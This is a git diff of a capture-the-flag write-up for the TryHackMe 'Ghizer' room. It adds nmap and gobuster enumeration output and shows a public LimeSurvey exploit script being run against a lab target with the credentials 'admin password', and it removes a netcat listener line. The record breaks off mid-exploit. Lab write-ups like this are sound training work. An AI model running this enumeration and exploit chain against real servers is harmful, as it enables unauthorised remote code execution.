@@ -4,7 +4,8 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{351}}$$-day-streak in  <a href="h
 <img width="300px" src="https://github.com/user-attachments/assets/a49b4992-58ab-4c43-a80d-913bba4b4c49" alt="Your Image Badge"><br></p>
 <h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ghizer}}$$</h1>
 <p align="center"><em>lucrecia has installed multiple web applications on the server.</em>.<br>
-It is classified as a medium-level CTF.<br>It is .....<br>
+It is classified as a medium-level CTF.<br>
+You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
 Can be accessed clicking  <a href="https://tryhackme.com/room/ghizerctf">here</a>.</p>
 
 <p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/6464e191-2db2-423a-a124-bf35a4be3e65"> </p>
@@ -24,29 +25,101 @@ Can be accessed clicking  <a href="https://tryhackme.com/room/ghizerctf">here</a
 
 <br>
 
-```bash
-ffff
-```
-
-<br>
-
-> 1.2. <em>What is the login path for the wordpress installation?</em><br><a id='1.2'></a>
->> <strong><code>/?devtools</code></strong><br>
-<p></p>
+<p>- Used <code>nmap</code> and discovered 6 ports open.<br>
+-  What caught my eye was 80: LimeSurvey and 443:Wordpress.</p>
 
 <br>
 
 ```bash
-:~/Ghidra# nc -lvnp 1337
+:~/Ghizer# nmap -sC -sV -Pn -p- TargetIP
+...
+PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
+|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+|     Please login with USER and PASS.
+|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
+80/tcp    open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: LimeSurvey http://www.limesurvey.org
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title:         LimeSurvey    
+443/tcp   open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Ghizer &#8211; Just another WordPress site
+| ssl-cert: Subject: commonName=ubuntu
+...
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+18002/tcp open  java-rmi   Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:42729
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+42729/tcp open  java-rmi   Java RMI
+42823/tcp open  tcpwrapped
+...
 ```
 
 <br>
 
+<p>-  Used <code>gobuster</code> against http://TargetIP.</p>
+
+<br>
+
+```bash
+
+:~/Ghizer# gobuster dir -u http://TargetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+...
+/themes               (Status: 301) [Size: 315] [--> http://TargetIP/themes/]
+/admin                (Status: 301) [Size: 314] [--> http://TargetIP/admin/]
+/assets               (Status: 301) [Size: 315] [--> http://TargetIP/assets/]
+/upload               (Status: 301) [Size: 315] [--> http://TargetIP/upload/]
+/tests                (Status: 301) [Size: 314] [--> http://TargetIP/tests/]
+/plugins              (Status: 301) [Size: 316] [--> http://TargetIP/plugins/]
+/application          (Status: 301) [Size: 320] [--> http://TargetIP/application/]
+/tmp                  (Status: 301) [Size: 312] [--> http://TargetIP/tmp/]
+/framework            (Status: 301) [Size: 318] [--> http://TargetIP/framework/]
+/locale               (Status: 301) [Size: 315] [--> http://TargetIP/locale/]
+/installer            (Status: 301) [Size: 318] [--> http://TargetIP/installer/]
+/docs                 (Status: 301) [Size: 313] [--> http://TargetIP/docs/]
+/third_party          (Status: 301) [Size: 320] [--> http://TargetIP/third_party/]
+/server-status        (Status: 403) [Size: 278]
+Progress: 218275 / 218276 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+<br>
+
+<p>-  Used <code>dirsearch</code>.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/796e4f19-3993-4a22-8392-39bf36dc82a1)
+
+<br>
+
+<p>Got the shell and estabilized it.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/105bfab7-133f-490e-b006-1425f67ec672)
+
+<br>
 
 ```bash
 :~/Ghidra# ls
 46634.py
-:~/Ghidra# python2 46634.py http://TargetIP admin password
+:~/Ghidra# python 46634.py http://TargetIP admin password
 [*] Logging in to LimeSurvey...
 [*] Creating a new Survey...
 [+] SurveyID: 595385
